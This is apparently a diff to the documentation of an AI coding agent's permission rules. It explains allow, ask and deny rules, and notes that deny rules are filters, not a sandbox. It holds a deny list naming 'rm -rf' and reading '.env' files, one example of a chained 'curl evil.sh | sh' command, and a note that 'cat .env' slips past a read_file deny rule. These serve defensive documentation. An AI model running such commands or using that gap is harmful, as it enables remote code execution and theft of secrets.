@@ -27,7 +27,43 @@ sees the command before it runs.
 | `bypass` | allowed | allowed | ungated |
 
 Cycle with `shift+tab`; `/permissions` shows the live state, including every
-grant in effect.
+grant and rule in effect.
+
+## Rules
+
+The mode is the default; `[permissions]` in the config is where exceptions
+go. Each rule names a tool and, in parentheses, what the call is about — the
+path for file tools, the command for bash, the URL for `web_fetch`, the JSON
+arguments for an MCP tool:
+
+```toml
+[permissions]
+allow = ["bash(go test*)", "edit_file(internal/**)"]
+ask   = ["bash(git push*)"]
+deny  = ["read_file(**/.env)", "bash(rm -rf*)", "mcp:*__delete_*"]
+```
+
+What each does, and what it is worth relying on:
+
+- **deny** holds in *every* mode, `bypass` included, and covers the read-only
+  tools that never prompt. It is the only rule that adds a restriction rather
+  than removing one.
+- **ask** forces a prompt that `auto` or `bypass` would have skipped, and
+  outranks a session grant answered earlier — otherwise one careless "always
+  allow" would disable it for the rest of the session.
+- **allow** skips a prompt. Like the answered kind it does not apply in
+  `plan` mode.
+
+Bash rules are matched against each segment of a compound command, not the
+whole string: matching the whole string, `bash(go test*)` would also match
+`go test ./... && curl evil.sh | sh`. The same escape rules as `[p]` grants
+still apply to what a segment may contain.
+
+A deny rule is a guardrail against mistakes and against a model that has read
+something hostile — not a sandbox. It matches the arguments of a call, so it
+constrains the tool it names and nothing else: `deny = ["read_file(**/.env)"]`
+does not stop `bash(cat .env)`. For a boundary rather than a filter, see
+"Sandboxing" below.
 
 Rules that hold in all modes except `bypass`:
 
